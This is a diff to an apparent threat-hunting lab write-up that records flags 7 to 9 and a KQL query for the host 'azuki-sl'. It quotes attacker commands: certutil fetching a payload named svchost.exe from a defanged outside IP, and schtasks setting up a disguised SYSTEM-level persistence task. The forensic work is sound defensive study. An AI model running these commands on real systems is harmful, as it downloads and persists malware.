@@ -157,6 +157,7 @@ DeviceRegistryEvents
 ##  Flag 7 – Identify the Windows-native binary the attacker abused to download files
 
 **Finding**: The attacker abused `certutil.exe` to download malicious content from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `svchost.exe`.  
+**Time of Event**: `2025-11-19T19:07:01.032199Z`
 **Command Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
 
 
@@ -169,33 +170,22 @@ DeviceFileEvents
 ```
 ---
 
-##  Flag 8 – Identify the name of the scheduled task created for persistence
+##  Flag 8 & 9 – Identify the name and executable path of the scheduled task created for persistence
 
-**Objective**: 
+**Finding**: The attacker created a scheduled task named "Windows Update Check" that would secretly execute the malicious payload `svchost.exe` daily at 02:00 under the SYSTEM account.  
+**Time of Event**: `2025-11-19T19:07:46.9796512Z`  
+**Command Used**: `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`
 
-**Finding**:  
-
-**KQL Query**:
-```
-```
-
-**Notes:**
-
----
-##  Flag 9 – Identify the executable path configured in the scheduled task
-
-**Objective**: 
-
-**Finding**:  
 
 **KQL Query**:
 ```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where FileName contains "schtasks.exe"
+
 ```
 
-**Notes:**
-
 ---
-
 ##  Flag 10 –  Identify the IP address of the command and control server
 
 **Objective**: 
